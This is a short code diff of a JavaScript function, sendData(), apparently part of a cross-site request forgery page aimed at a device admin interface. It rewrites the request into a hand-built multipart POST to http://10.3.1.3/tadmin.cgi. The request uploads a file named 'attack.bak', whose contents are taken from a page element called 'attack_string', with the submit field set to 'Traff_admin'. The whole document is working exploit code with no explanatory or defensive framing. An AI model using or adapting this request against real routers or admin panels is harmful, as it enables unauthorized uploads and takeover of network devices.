@@ -1,19 +1,24 @@
 function sendData() {
   var XHR = new XMLHttpRequest();
   var url = "http://10.3.1.3/tadmin.cgi";
-  var exploit_file = "exploit_file.bak";
-  var FD  = new FormData();
-
-  FD.append("file", exploit_file)
+  attack_content = document.getElementById("attack_string").innerHTML;
+  request_content = "------WebKitFormBoundaryjS2RaK3yh4DE8frf\r\n" + 
+										'Content-Disposition: form-data; name="submit_button"\r\n\r\n' +
+										"Traff_admin\r\n" +
+										"------WebKitFormBoundaryjS2RaK3yh4DE8frf\r\n" +
+										'Content-Disposition: form-data; name="file"; filename="attack.bak"\r\n' +
+										"Content-Type: application/x-trash\r\n\r\n" +
+										attack_content + "\r\n" + 
+										"------WebKitFormBoundaryjS2RaK3yh4DE8frf--\r\n"
 
   // Set up our request
   XHR.open('POST', url);
 
   // Set the content type
-  XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  XHR.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryjS2RaK3yh4DE8frf");
 
   // Submit the form
-  XHR.send(FD);
+  XHR.send(request_content);
 }
 
 
